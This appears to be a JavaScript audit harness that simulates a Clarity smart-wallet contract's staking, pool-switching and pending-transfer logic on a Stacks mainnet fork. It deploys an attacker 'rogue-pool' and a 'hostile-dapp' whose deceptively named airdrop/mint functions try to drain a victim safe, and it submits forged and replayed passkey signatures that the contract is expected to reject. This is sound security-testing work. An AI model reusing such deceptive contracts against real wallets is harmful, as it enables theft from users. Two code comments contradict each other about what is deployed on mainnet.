// simul-juice-savings.js
// Stxer mainnet-fork harness for contracts/juice-savings.clar (pillar-wallets
// 321f103) and the two staking builders of contracts/juice-safe-auth-helpers-v3.clar
// it calls. Pre-deploy audit coverage for AIBTC bounty mwvrpx3a633f201e8caa:
// only the code that is NEW vs juice-autostake-safe.
//
// New code in juice-savings vs juice-autostake-safe (diff at 321f103):
//   N1 onboard: recovery-wallet (optional principal), none -> SP000...; registers
//      against SPV9K21....juice-savings in fakfun-wallet-core-v2
//   N2 stake-stx-juice takes the pool as <signer-manager-trait>, is-allowed-pool
//      (juice-pool-sbtc-signer, juice-pool-stx-signer, fastpool-max500-signer-manager),
//      passkey hash = helpers-v3 build-stake-stx-juice-pool-hash (signs the pool)
//   N3 update-stake-stx-juice (signer, old-signer): 0/0 allowed only when the pool
//      changes; is-allowed-pool on the new pool; helpers-v3 update hash signs
//      the new pool, NOT old-signer
//   N4 unstake (old-signer), restake (signer): restake must name the current pool
//   N5 execute-pending-{stx-transfer,sbtc-transfer,sbtc-withdrawal}-now: sig-auth
//      optional; passkey-created op -> admin tx-sender confirms; admin-created op
//      -> passkey sig confirms (+ gas)
//   N6 error codes renumbered u4007..u4023 (err-invalid-pool new = u4023)
//
// Three safes, all deployed from the same 321f103 bytes (sha256 printed):
//   A  SPV9K21....juice-savings (canonical)  recovery some  pools sbtc -> stx -> fastpool
//   B  SP28MP....bob-savings   (relay copy)  recovery none  pending-op / -now matrix, stx pool
//   C  SP28MP....carol-savings (relay copy)  recovery some  stake straight into fastpool + restake
// One passkey for all three safes (one user, several safes), so the cross-safe
// test isolates the SIP-018 domain (wallet = the safe).
// All three pools are LIVE and registered in pox-5 (get-signer-info some): no
// register-self, no fork-only pool deploys. helpers-v3 and the safes are not
// on mainnet and are deployed here.
//
// Run: STACKS_NODE_API=https://api.hiro.so node simul-juice-savings.js
//   (default node is the Juice box http://77.42.3.101/stacks-api)
import crypto from "node:crypto";
import fs from "node:fs";
import {
  tupleCV, uintCV, bufferCV, noneCV, someCV, trueCV, falseCV,
  principalCV, standardPrincipalCV, contractPrincipalCV, stringAsciiCV,
  serializeCV, deserializeCV, cvToString, ClarityVersion,
} from "@stacks/transactions";
import { SimulationBuilder, getSimulationResult } from "stxer";
import { generateP256Keypair, signChallengeWithRpId } from "./lib-webauthn-test-signer.mjs";
import { installChunkedSubmit } from "./_chunked-submit.mjs";
installChunkedSubmit(40);

const STACKS_NODE_API = process.env.STACKS_NODE_API || "http://77.42.3.101/stacks-api";
const DEPLOYER = "SPV9K21TBFAK4KNRJXF5DFP8N7W46G4V9RCJDC22";          // canonical deployer + default keeper + core-v2 admin
const FAKFUN_DEPLOYER = "SP28MP1HQDJWQAFSQJN2HBAXBVP7H7THD1W2NYZVK";  // onboard caller, relay copies
const OWNER = "SP2C7BCAP2NH3EYWCCVHJ6K0DMZBXDFKQ56KR7QN2";            // admin wallet + sBTC whale
const RECOVERY = "SP3HXJJMJQ06GNAZ8XWDN1QM48JEDC6PP6W3YZPZJ";
const RANDOM = "SP1MGH8BH1KRY49Z7EE5TY0JVKT6C3NT9RTVM8FND";            // attacker
const RELAYER = "SP102V8P0F7JX67ARQ77WEA3D3CFB5XW39REDT0AM";
const RECIPIENT = "SP22WH53NS94VR6N145ZX77BK4S0EWFBE41VW3Z6B";
const STX_WHALE = "SP354663MXNWN2B6HKNBYD8JBNJK2ZNBZE764X1RR";
const SBTC_TOKEN = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token";
const POX5 = "SP000000000000000000002Q6VF78.pox-5";
const WALLET_CORE = `${DEPLOYER}.fakfun-wallet-core-v2`;
const HELPER3 = `${DEPLOYER}.juice-safe-auth-helpers-v3`;
const P_SBTC = `${DEPLOYER}.juice-pool-sbtc-signer`;
const P_STX = `${DEPLOYER}.juice-pool-stx-signer`;
const P_FAST = "SPMPMA1V6P430M8C91QS1G9XJ95S59JS1TZFZ4Q4.fastpool-max500-signer-manager";
const P_ROGUE = `${RANDOM}.rogue-pool`;  // byte copy of juice-pool-stx-signer under another principal
const A = `${DEPLOYER}.juice-savings`;
const B = `${FAKFUN_DEPLOYER}.bob-savings`;
const C = `${FAKFUN_DEPLOYER}.carol-savings`;
const EVIL = `${FAKFUN_DEPLOYER}.evil-savings`;  // same source + one trailing comment
const HOSTILE = `${RANDOM}.hostile-dapp`;
const GAS_STATION = "gas-station";
const CLARITY_6 = ClarityVersion.Clarity6 ?? 6;
const RP_ID = "juiceofbtc.com";
const FIRST_BURN = 666050, CYCLE = 2100, PREPARE = 100;

const FUND = 1_000_000_000;
const STX_THR = 100_000_000, SBTC_THR = 100_000, COOLDOWN = 144;
const STAKE_A = 500_000_000, INC_A = 100_000_000, STAKE_B = 300_000_000, STAKE_C = 500_000_000;
const STX_OVER = 150_000_000, SBTC_OVER = 150_000, WD_OVER = 120_000, WD_FEE = 1_000, HOSTILE_UNDER = 50_000_000;
const FUND_SBTC_B = 600_000, FUND_SBTC = 5_000;
const BTC_RCPT = { version: Buffer.from("04", "hex"), hashbytes: Buffer.from("aa".repeat(20), "hex") }; // P2WPKH
const btcRcptCV = () => tupleCV({ version: bufferCV(BTC_RCPT.version), hashbytes: bufferCV(BTC_RCPT.hashbytes) });
// Fastpool payout config passed as pox-5 signer-calldata (3-field shape of parse-payout-calldata)
const PAYOUT = tupleCV({ "pox-addr": btcRcptCV(), "max-fee": uintCV(1_000), "min-claim": uintCV(5_000) });
const strip = (h) => (h.startsWith("0x") ? h.slice(2) : h);
const PAYOUT_BUF = Buffer.from(strip(serializeCV(PAYOUT)), "hex");
const CD_PAYOUT = someCV(bufferCV(PAYOUT_BUF));
const CD_X = someCV(bufferCV(Buffer.from("x")));

// -- SIP-018 mirrors -----------------------------------------------------------
const SIP018_PREFIX = Buffer.from("534950303138", "hex");
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
const cvSha256 = (cv) => sha256(Buffer.from(strip(serializeCV(cv)), "hex"));
const challenge = (wallet, t) => sha256(Buffer.concat([SIP018_PREFIX, cvSha256(tupleCV({
  name: stringAsciiCV("smart-wallet-standard"), version: stringAsciiCV("1.0.0"), "chain-id": uintCV(1), wallet: principalCV(wallet),
})), cvSha256(t)]));
const T = {
  // juice-safe-auth-helpers-v3 (new)
  stake: (a, amt, pool, cd = noneCV()) => tupleCV({ topic: stringAsciiCV("stake-stx-juice-pool"), "auth-id": uintCV(a), "amount-ustx": uintCV(amt), pool: principalCV(pool), "signer-calldata": cd }),
  update: (a, inc, ext, pool, cd = noneCV()) => tupleCV({ topic: stringAsciiCV("update-stake-stx-juice-pool"), "auth-id": uintCV(a), "amount-increase": uintCV(inc), "cycles-to-extend": uintCV(ext), pool: principalCV(pool), "signer-calldata": cd }),
  // live helpers
  unstake: (a) => tupleCV({ topic: stringAsciiCV("unstake-stx-juice"), "auth-id": uintCV(a) }),
  now: (a, op) => tupleCV({ topic: stringAsciiCV("execute-now"), "auth-id": uintCV(a), "op-id": uintCV(op) }),
  veto: (a, op) => tupleCV({ topic: stringAsciiCV("veto-operation"), "auth-id": uintCV(a), "op-id": uintCV(op) }),
  stx: (a, amount, to) => tupleCV({ topic: stringAsciiCV("stx-transfer"), "auth-id": uintCV(a), amount: uintCV(amount), recipient: principalCV(to), memo: noneCV() }),
  ft: (a, amount, to, token) => tupleCV({ topic: stringAsciiCV("sip010-transfer"), "auth-id": uintCV(a), amount: uintCV(amount), recipient: principalCV(to), memo: noneCV(), sip010: principalCV(token) }),
  wd: (a, amount, fee) => tupleCV({ topic: stringAsciiCV("sbtc-withdrawal"), "auth-id": uintCV(a), amount: uintCV(amount), recipient: btcRcptCV(), "max-fee": uintCV(fee) }),
  recovery: (a, r) => tupleCV({ topic: stringAsciiCV("propose-recovery"), "auth-id": uintCV(a), "new-recovery": principalCV(r) }),
};
const cp = (id) => { const [a, n] = id.split("."); return contractPrincipalCV(a, n); };

async function api(path, body) {
  const r = await fetch(`${STACKS_NODE_API}${path}`, body ? { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) } : {});
  if (!r.ok) throw new Error(`${path}: HTTP ${r.status}`);
  return r.json();
}
async function readOnly(cid, fn, args = []) {
  const [addr, name] = cid.split(".");
  const r = await api(`/v2/contracts/call-read/${addr}/${name}/${fn}`, { sender: addr, arguments: args.map((c) => "0x" + strip(serializeCV(c))) });
  return cvToString(deserializeCV(strip(r.result)));
}

async function main() {
  // deploy bytes = the faktory-dao templates (comment-stripped, clarinet-formatted)
  const tpl = (n) => { const t = fs.readFileSync(`${process.env.HOME}/projects/faktory-dao/backend/server/utils/${n}-template.ts`, "utf8"); return t.slice(t.indexOf("= `") + 3, t.lastIndexOf("`")); };
  const safeSrc = tpl("juice-savings");
  const helperSrc = tpl("juice-safe-auth-helpers-v3");
  const h = (s) => crypto.createHash("sha256").update(s).digest("hex");
  console.log(`juice-savings sha256 ${h(safeSrc)} (${Buffer.byteLength(safeSrc)} B), helpers-v3 sha256 ${h(helperSrc)}`);

  for (const [n, want] of [["juice-safe-auth-helpers-v3", helperSrc], ["juice-savings", safeSrc]]) {
    const live = (await api(`/v2/contracts/source/${DEPLOYER}/${n}?proof=0`)).source;
    if (live !== want) throw new Error(`${n}: live bytes differ from the template`);
  }
  console.log("live helpers-v3 + juice-savings == faktory-dao templates");
  const pox = await api("/v2/pox");
  if (pox.first_burnchain_block_height !== FIRST_BURN || pox.reward_cycle_length !== CYCLE || pox.prepare_phase_block_length !== PREPARE) throw new Error("pox timing changed");
  const startBurn = (await api("/v2/info")).burn_block_height;
  const off = (startBurn - FIRST_BURN) % CYCLE;
  // stake / unstake refuse the prepare phase; the cooldown advance adds 145 blocks
  const toSafe = off > CYCLE - PREPARE - 400 ? CYCLE - off + 20 : 0;
  const GAS = BigInt((await readOnly(`${DEPLOYER}.${GAS_STATION}`, "get-gas")).replace(/^u/, ""));
  for (const p of [P_SBTC, P_STX, P_FAST]) {
    const si = await readOnly(POX5, "get-signer-info", [principalCV(p)]);
    if (!si.startsWith("(some")) throw new Error(`${p} not registered in pox-5`);
  }
  const rogueSrc = (await api(`/v2/contracts/source/${DEPLOYER}/juice-pool-stx-signer?proof=0`)).source;
  console.log(`start burn ${startBurn} (offset ${off}); gas ${GAS} sats; pre-advance ${toSafe}`);

  const key = generateP256Keypair(), key2 = generateP256Keypair();
  const pub = bufferCV(Buffer.from(strip(key.pubKeyHex), "hex"));
  const sigTuple = (authId, s, pk) => tupleCV({
    "auth-id": uintCV(authId), pubkey: bufferCV(Buffer.from(strip(pk), "hex")),
    signature: bufferCV(Buffer.from(strip(s.signatureHex), "hex")),
    "authenticator-data": bufferCV(Buffer.from(strip(s.authenticatorDataHex), "hex")),
    "client-data-prefix": bufferCV(Buffer.from(strip(s.clientDataPrefixHex), "hex")),
    "client-data-suffix": bufferCV(Buffer.from(strip(s.clientDataSuffixHex), "hex")),
  });
  // sig over tuple t for `domainWallet`; the tuple's auth-id field is `authId` unless overridden
  const auth = (domainWallet, authId, t, k = key) => sigTuple(authId, signChallengeWithRpId(challenge(domainWallet, t), k.privKey, RP_ID), k.pubKeyHex);
  const sAuth = (...a) => someCV(auth(...a));
  const GASCV = someCV(contractPrincipalCV(DEPLOYER, GAS_STATION));

  const plan = [];
  const b = SimulationBuilder.new({ stacksNodeAPI: STACKS_NODE_API });
  const okre = /^\(ok/;
  const step = (label) => plan.push({ kind: "fund", label });
  const evalw = (wallet, label, code, capture) => { b.addEvalCode(wallet, code); plan.push({ kind: "eval", label, capture }); };
  // stxer runs steps in the tip's block until told otherwise: one block holds
  // ~80 of these calls before the block cost budget runs out, so advance one
  // burn block (one tenure) every 15 txs. Adds ~10 burn blocks in total.
  let txn = 0;
  const tick = () => { if (++txn % 15 === 0) { b.addAdvanceBlocks({ bitcoin_blocks: 1, stacks_blocks_per_bitcoin: 1 }); plan.push({ kind: "adv", label: "advance 1 burn block (fresh block budget)" }); } };
  const call = (label, sender, cid, fn, args, expect, ev) => {
    tick();
    b.withSender(sender).addContractCall({ contract_id: cid, function_name: fn, function_args: args });
    plan.push({ kind: "tx", label, expect, ev });
  };
  const deploy = (label, sender, name, src, ver, expect = "ok") => {
    tick();
    b.withSender(sender).addContractDeploy({ contract_name: name, source_code: src, clarity_version: ver });
    plan.push({ kind: "deploy", label, expect });
  };
  const snap = (wallet, tag) => evalw(wallet, `${tag} snapshot`, `{ acct: (stx-account current-contract), info: (contract-call? '${POX5} get-staker-info current-contract),
    cyc: (contract-call? '${POX5} current-pox-reward-cycle), sbtc: (unwrap-panic (contract-call? '${SBTC_TOKEN} get-balance-available current-contract)),
    sbtcl: (unwrap-panic (contract-call? '${SBTC_TOKEN} get-balance-locked current-contract)), rstx: (stx-get-balance '${RECIPIENT}),
    rsbtc: (unwrap-panic (contract-call? '${SBTC_TOKEN} get-balance '${RECIPIENT})), xstx: (stx-get-balance '${RANDOM}),
    recovery: (var-get recovery-address), lock: (var-get token-lock-enabled) }`, tag);
  const op = (wallet, id, tag) => evalw(wallet, `${tag} op${id}`, `(get-pending-operation u${id})`, tag);
  const mirror = [];
  const hashEval = (wallet, label, fn, tupleSrc, jsTuple) => {
    evalw(wallet, label, `(contract-call? '${HELPER3} ${fn} ${tupleSrc})`, `hash:${label}`);
    mirror.push({ label, want: "0x" + challenge(wallet, jsTuple).toString("hex") });
  };
  const sa = (w, id, t) => sAuth(w, id, t);
  const stxArgs = (amount, sig) => [uintCV(amount), standardPrincipalCV(RECIPIENT), noneCV(), sig, noneCV()];
  const sbtcArgs = (amount, sig) => [uintCV(amount), standardPrincipalCV(RECIPIENT), noneCV(), contractPrincipalCV(...SBTC_TOKEN.split(".")), stringAsciiCV("sbtc-token"), sig, noneCV()];
  const wdArgs = (sig) => [uintCV(WD_OVER), btcRcptCV(), uintCV(WD_FEE), sig, noneCV()];

  // -- D: deploys ------------------------------------------------------------------
  // helpers-v3 and the canonical juice-savings (A) are LIVE on mainnet since
  // 2026-11-27 with exactly the template bytes (checked below): use them as is.
  evalw(A, "D1 live juice-savings == template bytes (checked in JS) / owner unset", "(var-get owner)", "liveOwner");
  deploy("D3 relay deploys bob-savings B (same bytes)", FAKFUN_DEPLOYER, "bob-savings", safeSrc, CLARITY_6);
  deploy("D4 relay deploys carol-savings C (same bytes)", FAKFUN_DEPLOYER, "carol-savings", safeSrc, CLARITY_6);
  deploy("D5 relay deploys evil-savings (same source + 1 comment line)", FAKFUN_DEPLOYER, "evil-savings", safeSrc + "\n;; x\n", CLARITY_6);
  deploy("D6 attacker deploys rogue-pool (juice-pool-stx-signer bytes, not allow-listed)", RANDOM, "rogue-pool", rogueSrc, ClarityVersion.Clarity5);
  deploy("D8 attacker deploys hostile-dapp (calls B as whoever calls it)", RANDOM, "hostile-dapp", `
(define-public (claim-airdrop)
  (contract-call? '${B} execute-pending-stx-transfer-now u2 none none none))
(define-public (free-mint)
  (contract-call? '${B} stx-transfer u${HOSTILE_UNDER} '${RANDOM} none none none))
`, ClarityVersion.Clarity4);

  // -- O: onboard + registration (N1) ---------------------------------------------
  const onboardArgs = (rec, cd = COOLDOWN, owner = OWNER) => [pub, standardPrincipalCV(owner), rec, uintCV(STX_THR), uintCV(SBTC_THR), uintCV(cd)];
  call("O1 onboard B before core-v2 knows juice-savings -> core u6001", FAKFUN_DEPLOYER, B, "onboard", onboardArgs(noneCV()), "(err u6001)");
  call("O2 core-v2 set-verified-contract(juice-savings) (hash computed)", DEPLOYER, WALLET_CORE, "set-verified-contract", [principalCV(A), noneCV()], okre);
  call("O3 RANDOM onboard A -> u4001", RANDOM, A, "onboard", onboardArgs(someCV(standardPrincipalCV(RECOVERY))), "(err u4001)");
  call("O4 onboard A with recovery = owner -> u4001", FAKFUN_DEPLOYER, A, "onboard", onboardArgs(someCV(standardPrincipalCV(OWNER))), "(err u4001)");
  call("O5 onboard A with recovery = the safe itself -> u4001", FAKFUN_DEPLOYER, A, "onboard", onboardArgs(someCV(principalCV(A))), "(err u4001)");
  call("O6 onboard A cooldown 143 -> u4017 (renumbered err-cooldown-too-short)", FAKFUN_DEPLOYER, A, "onboard", onboardArgs(someCV(standardPrincipalCV(RECOVERY)), 143), "(err u4017)");
  call("O7 onboard A cooldown 4033 -> u4016 (renumbered err-cooldown-too-long)", FAKFUN_DEPLOYER, A, "onboard", onboardArgs(someCV(standardPrincipalCV(RECOVERY)), 4033), "(err u4016)");
  call("O8 onboard A, recovery some", FAKFUN_DEPLOYER, A, "onboard", onboardArgs(someCV(standardPrincipalCV(RECOVERY))), okre);
  call("O9 onboard A twice -> u4001", FAKFUN_DEPLOYER, A, "onboard", onboardArgs(someCV(standardPrincipalCV(RECOVERY))), "(err u4001)");
  call("O10 onboard B (relay copy), recovery none", FAKFUN_DEPLOYER, B, "onboard", onboardArgs(noneCV()), okre);
  call("O11 onboard C (relay copy), recovery some", FAKFUN_DEPLOYER, C, "onboard", onboardArgs(someCV(standardPrincipalCV(RECOVERY))), okre);
  call("O12 onboard evil-savings (other bytes) -> core u6002", FAKFUN_DEPLOYER, EVIL, "onboard", onboardArgs(noneCV()), "(err u6002)");
  evalw(A, "O13 core-v2 whitelist A/B/C/evil", `{ a: (contract-call? '${WALLET_CORE} is-whitelisted '${A}), b: (contract-call? '${WALLET_CORE} is-whitelisted '${B}),
    c: (contract-call? '${WALLET_CORE} is-whitelisted '${C}), e: (contract-call? '${WALLET_CORE} is-whitelisted '${EVIL}), ra: (var-get recovery-address) }`, "wl");
  evalw(B, "O14 B recovery-address / owner", `{ r: (var-get recovery-address), o: (var-get owner) }`, "brec");
  call("O15 B (recovery none): RECOVERY recover-inactive-wallet -> u4007 (renumbered err-inactive-required)", RECOVERY, B, "recover-inactive-wallet", [standardPrincipalCV(RECOVERY)], "(err u4007)");

  // -- funding ------------------------------------------------------------------------
  for (const w of [A, B, C]) {
    b.withSender(STX_WHALE).addSTXTransfer({ recipient: w, amount: FUND });
    step(`fund ${w.split(".")[1]} ${FUND / 1e6} STX`);
  }
  call(`fund B ${FUND_SBTC_B} sats`, OWNER, SBTC_TOKEN, "transfer", [uintCV(FUND_SBTC_B), standardPrincipalCV(OWNER), principalCV(B), noneCV()], okre);
  for (const w of [A, C]) call(`fund ${w.split(".")[1]} ${FUND_SBTC} sats (gas)`, OWNER, SBTC_TOKEN, "transfer", [uintCV(FUND_SBTC), standardPrincipalCV(OWNER), principalCV(w), noneCV()], okre);
  if (toSafe > 0) { b.addAdvanceBlocks({ bitcoin_blocks: toSafe, stacks_blocks_per_bitcoin: 1 }); plan.push({ kind: "adv", label: `advance ${toSafe} burn blocks (clear of the prepare phase)` }); }

  // -- H: helpers-v3 hash mirrors (JS == contract, domain = calling safe) -------------
  hashEval(A, "H1 build-stake-stx-juice-pool-hash (cd none)", "build-stake-stx-juice-pool-hash", `{ auth-id: u900, amount-ustx: u5, pool: '${P_FAST}, signer-calldata: none }`, T.stake(900, 5, P_FAST));
  hashEval(A, "H2 build-stake-stx-juice-pool-hash (cd some)", "build-stake-stx-juice-pool-hash", `{ auth-id: u901, amount-ustx: u7, pool: '${P_STX}, signer-calldata: (some 0x78) }`, T.stake(901, 7, P_STX, CD_X));
  hashEval(A, "H3 build-update-stake-stx-juice-pool-hash", "build-update-stake-stx-juice-pool-hash", `{ auth-id: u902, amount-increase: u1, cycles-to-extend: u2, pool: '${P_SBTC}, signer-calldata: none }`, T.update(902, 1, 2, P_SBTC));
  hashEval(B, "H4 build-stake-stx-juice-pool-hash from B (domain binds B)", "build-stake-stx-juice-pool-hash", `{ auth-id: u900, amount-ustx: u5, pool: '${P_FAST}, signer-calldata: none }`, T.stake(900, 5, P_FAST));

  // -- K: stake (N2) on A -----------------------------------------------------------
  call("K1 owner stake 0 -> u4020 (renumbered err-zero-amount)", OWNER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(0), noneCV(), noneCV(), noneCV()], "(err u4020)");
  call("K2 owner stake into rogue-pool -> u4023 err-invalid-pool", OWNER, A, "stake-stx-juice", [cp(P_ROGUE), uintCV(STAKE_A), noneCV(), noneCV(), noneCV()], "(err u4023)");
  call("K3 RANDOM stake (admin path) -> u4001", RANDOM, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), noneCV(), noneCV(), noneCV()], "(err u4001)");
  call("K4 passkey sig for pool stx-signer, sent with sbtc-signer -> u4002", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), sa(A, 1, T.stake(1, STAKE_A, P_STX)), noneCV(), noneCV()], "(err u4002)");
  call("K5 passkey sig for amount+1 -> u4002", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), sa(A, 2, T.stake(2, STAKE_A + 1, P_SBTC)), noneCV(), noneCV()], "(err u4002)");
  call("K6 passkey sig for calldata some 0x78, sent none -> u4002", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), sa(A, 3, T.stake(3, STAKE_A, P_SBTC, CD_X)), noneCV(), noneCV()], "(err u4002)");
  call("K7 passkey sig auth-id 4 submitted as auth-id 5 -> u4002", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), someCV(sigTuple(5, signChallengeWithRpId(challenge(A, T.stake(4, STAKE_A, P_SBTC)), key.privKey, RP_ID), key.pubKeyHex)), noneCV(), noneCV()], "(err u4002)");
  call("K8 passkey sig made for safe B, sent to A -> u4002 (domain)", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), sa(B, 6, T.stake(6, STAKE_A, P_SBTC)), noneCV(), noneCV()], "(err u4002)");
  call("K9 unregistered passkey -> u4004", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), someCV(auth(A, 7, T.stake(7, STAKE_A, P_SBTC), key2)), noneCV(), noneCV()], "(err u4004)");
  call("K10 passkey sig into rogue-pool (signed rogue) -> u4023", RELAYER, A, "stake-stx-juice", [cp(P_ROGUE), uintCV(STAKE_A), sa(A, 8, T.stake(8, STAKE_A, P_ROGUE)), noneCV(), noneCV()], "(err u4023)");
  snap(A, "a0");
  const k11 = sa(A, 9, T.stake(9, STAKE_A, P_SBTC));
  call(`K11 passkey stake ${STAKE_A / 1e6} STX into juice-pool-sbtc-signer, gas`, RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), k11, GASCV, noneCV()], okre, "K11");
  snap(A, "a1");
  call("K12 K11 signature replayed -> u4006", RELAYER, A, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_A), k11, GASCV, noneCV()], "(err u4006)");
  call("K13 owner stake again (other pool) -> pox-5 ERR_ALREADY_STAKED u19", OWNER, A, "stake-stx-juice", [cp(P_STX), uintCV(STAKE_A), noneCV(), noneCV(), noneCV()], "(err u19)");

  // -- U: update / pool switch (N3) on A ------------------------------------------------
  call("U1 owner update 0/0, same pool -> u4020", OWNER, A, "update-stake-stx-juice", [cp(P_SBTC), cp(P_SBTC), uintCV(0), uintCV(0), noneCV(), noneCV(), noneCV()], "(err u4020)");
  call("U2 owner update +10 STX into rogue-pool -> u4023", OWNER, A, "update-stake-stx-juice", [cp(P_ROGUE), cp(P_SBTC), uintCV(10_000_000), uintCV(0), noneCV(), noneCV(), noneCV()], "(err u4023)");
  call("U3 owner update 0/0 switch to rogue-pool -> u4023 (0/0 passes, pool check refuses)", OWNER, A, "update-stake-stx-juice", [cp(P_ROGUE), cp(P_SBTC), uintCV(0), uintCV(0), noneCV(), noneCV(), noneCV()], "(err u4023)");
  call("U4 (triage #6) owner switch with wrong old-signer (fastpool) -> pox-5 u36, abort only", OWNER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_FAST), uintCV(0), uintCV(0), noneCV(), noneCV(), noneCV()], "(err u36)");
  call("U5 owner update extend 1 cycle (97 > 96) -> pox-5 u20", OWNER, A, "update-stake-stx-juice", [cp(P_SBTC), cp(P_SBTC), uintCV(0), uintCV(1), noneCV(), noneCV(), noneCV()], "(err u20)");
  call("U6 passkey switch sig for pool fastpool, sent stx-signer -> u4002", RELAYER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_SBTC), uintCV(0), uintCV(0), sa(A, 10, T.update(10, 0, 0, P_FAST)), noneCV(), noneCV()], "(err u4002)");
  call("U7 passkey sig for amount-increase 1, sent 0 -> u4002", RELAYER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_SBTC), uintCV(0), uintCV(0), sa(A, 11, T.update(11, 1, 0, P_STX)), noneCV(), noneCV()], "(err u4002)");
  call("U8 passkey sig for cycles 1, sent 0 -> u4002", RELAYER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_SBTC), uintCV(0), uintCV(0), sa(A, 12, T.update(12, 0, 1, P_STX)), noneCV(), noneCV()], "(err u4002)");
  call("U9 passkey sig for calldata some 0x78, sent none -> u4002", RELAYER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_SBTC), uintCV(0), uintCV(0), sa(A, 13, T.update(13, 0, 0, P_STX, CD_X)), noneCV(), noneCV()], "(err u4002)");
  call("U10 (triage #6) passkey switch signed correctly, submitter swaps old-signer -> pox-5 u36 (unsigned field, abort only)", RELAYER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_FAST), uintCV(0), uintCV(0), sa(A, 14, T.update(14, 0, 0, P_STX)), noneCV(), noneCV()], "(err u36)");
  call("U11 passkey switch 0/0 sbtc-signer -> stx-signer, gas", RELAYER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_SBTC), uintCV(0), uintCV(0), sa(A, 15, T.update(15, 0, 0, P_STX)), GASCV, noneCV()], okre, "U11");
  snap(A, "a2");
  call(`U12 owner update +${INC_A / 1e6} STX, same pool stx-signer`, OWNER, A, "update-stake-stx-juice", [cp(P_STX), cp(P_STX), uintCV(INC_A), uintCV(0), noneCV(), noneCV(), noneCV()], okre);
  snap(A, "a3");
  call("U13 owner switch 0/0 stx-signer -> fastpool, calldata = payout config", OWNER, A, "update-stake-stx-juice", [cp(P_FAST), cp(P_STX), uintCV(0), uintCV(0), noneCV(), noneCV(), CD_PAYOUT], okre, "U13");
  snap(A, "a4");
  evalw(A, "U14 fastpool get-payout-config A after U13", `(contract-call? '${P_FAST} get-payout-config current-contract)`, "payA1");

  // -- R: restake (N4) on A: no args, only on juice-pool-sbtc-signer (audit #5 fix) ----------
  call("R1 RANDOM restake -> u4001", RANDOM, A, "restake", [], "(err u4001)");
  call("R2 owner (not keeper) restake -> u4001", OWNER, A, "restake", [], "(err u4001)");
  call("R3 (#5 fixed) keeper restake A staked in fastpool -> u4023 err-invalid-pool", DEPLOYER, A, "restake", [], "(err u4023)");
  evalw(A, "R4 fastpool get-payout-config A after the refused restake", `(contract-call? '${P_FAST} get-payout-config current-contract)`, "payA2");

  // -- X: unstake (N4) on A -----------------------------------------------------------------
  call("X1 (triage #6) owner unstake with old-signer stx-signer (not current) -> pox-5 u36", OWNER, A, "unstake", [cp(P_STX), noneCV(), noneCV()], "(err u36)");
  call("X2 RANDOM unstake -> u4001", RANDOM, A, "unstake", [cp(P_FAST), noneCV(), noneCV()], "(err u4001)");
  call("X3 passkey unstake (fastpool), gas", RELAYER, A, "unstake", [cp(P_FAST), sa(A, 16, T.unstake(16)), GASCV], okre);
  snap(A, "a6");
  call("X4 keeper restake after unstake -> u4023 (pool check; A still listed under fastpool until unlock)", DEPLOYER, A, "restake", [], /^\(err u402[23]\)$/);

  // -- C: stake into juice-pool-sbtc-signer, keeper restake (the only pool restake serves) ----
  call("C1 owner stake C 500 STX into juice-pool-sbtc-signer", OWNER, C, "stake-stx-juice", [cp(P_SBTC), uintCV(STAKE_C), noneCV(), noneCV(), noneCV()], okre, "C1");
  snap(C, "c1");
  call("C2 RANDOM restake C -> u4001", RANDOM, C, "restake", [], "(err u4001)");
  call("C3 keeper restake C (no args) -> stakes all unlocked STX on juice-pool-sbtc-signer", DEPLOYER, C, "restake", [], okre, "C3");
  snap(C, "c2");
  call("C4 keeper restake C again, nothing unlocked, no cycles -> u4020", DEPLOYER, C, "restake", [], "(err u4020)");

  // -- E: pending ops + execute-*-now (N5) on B --------------------------------------------
  // op ids: 0 admin STX | 1 passkey STX | 2 passkey STX (hostile PoC) | 3 admin sBTC | 4 passkey sBTC
  //         5 admin withdrawal | 6 passkey withdrawal | 7 passkey STX (admin veto) | 8 admin STX (passkey veto)
  //         9 admin STX (plain execute after cooldown)
  snap(B, "b0");
  call("Q0 owner stx 150 (over) -> op0 admin-created", OWNER, B, "stx-transfer", stxArgs(STX_OVER, noneCV()), okre);
  call("Q1 passkey stx 150 -> op1 passkey-created", RELAYER, B, "stx-transfer", stxArgs(STX_OVER, sa(B, 1, T.stx(1, STX_OVER, RECIPIENT))), okre);
  call("Q2 passkey stx 150 -> op2 passkey-created", RELAYER, B, "stx-transfer", stxArgs(STX_OVER, sa(B, 2, T.stx(2, STX_OVER, RECIPIENT))), okre);
  call("Q3 owner sBTC 150000 -> op3 admin-created", OWNER, B, "sip010-transfer", sbtcArgs(SBTC_OVER, noneCV()), okre);
  call("Q4 passkey sBTC 150000 -> op4 passkey-created", RELAYER, B, "sip010-transfer", sbtcArgs(SBTC_OVER, sa(B, 3, T.ft(3, SBTC_OVER, RECIPIENT, SBTC_TOKEN))), okre);
  call("Q5 owner withdrawal 120000+1000 -> op5 admin-created", OWNER, B, "sbtc-initiate-withdrawal", wdArgs(noneCV()), okre);
  call("Q6 passkey withdrawal 120000+1000 -> op6 passkey-created", RELAYER, B, "sbtc-initiate-withdrawal", wdArgs(sa(B, 4, T.wd(4, WD_OVER, WD_FEE))), okre);
